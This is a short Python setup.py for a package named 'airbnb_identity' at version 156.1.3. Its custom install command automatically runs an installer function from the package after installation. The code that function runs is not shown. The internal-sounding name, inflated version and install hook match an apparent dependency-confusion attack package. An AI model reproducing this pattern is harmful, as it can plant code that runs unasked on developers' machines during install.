from setuptools import setup, find_packages
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        super().run()
        try:
            from airbnb_identity.installer import run_success
            run_success()
        except Exception as e:
            print("Post-install hook failed:", e)

setup(
    name="airbnb_identity",
    version="156.1.3",
    packages=find_packages(),
    cmdclass={"install": PostInstallCommand},
)